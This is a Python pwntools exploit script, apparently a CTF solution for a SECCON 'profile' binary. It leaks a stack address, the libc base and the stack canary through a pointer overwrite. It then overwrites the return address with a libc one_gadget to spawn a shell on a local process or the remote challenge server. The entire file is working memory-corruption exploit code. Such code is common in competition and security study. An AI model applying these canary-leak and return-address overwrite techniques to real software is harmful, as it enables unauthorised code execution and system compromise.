#!/usr/bin/env python
from pwn import *

def init(name, age, message):
    s.sendlineafter('Name >> ', name)
    s.sendlineafter('Age >> ', str(age))
    s.sendlineafter('Message >> ', message)

def update(message):
    s.sendlineafter('>> ', '1')
    s.sendlineafter('Input new message >> ', message)

def show():
    s.sendlineafter('>> ', '2')

while True:
    if len(sys.argv) == 1:
        s = process('./profile', env = {'LD_PRELOAD': './libc-2.23.so'})
    else:
        s = remote('profile.pwn.seccon.jp', 28553)

    init('A' * 8, 1, 'message')
    update('A' * 0x10 + '\x20')
    show()
    s.recvuntil('Name : ')
    stack_addr = u64(s.recvline(False).ljust(8, '\0'))
    if stack_addr >> 0x20 == 0x7fff and stack_addr & 0xff == 0x20:
        log.info('stack address: %#x' % stack_addr)
        break
    s.close()

update('A' * 0x10 + p64(stack_addr + 0x48) + p64(8))
show()
s.recvuntil('Name : ')
libc_base = u64(s.recvline(False)) - 0x20830
log.info('libc base: %#x' % libc_base)

update('A' * 0x10 + p64(stack_addr + 0x29) + p64(7))
show()
s.recvuntil('Name : ')
canary = u64(s.recvline(False) + '\0') << 8
log.info('canary: %#x' % canary)

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

payload = ''
payload += 'A' * 0x10
payload += p64(stack_addr + 0x10)
payload += p64(8)
payload += 'A' * 0x18
payload += p64(canary)
payload += 'A' * 0x18
payload += p64(libc_base + one_gadgets[0])
update(payload)

s.sendlineafter('>> ', '0')

s.interactive()
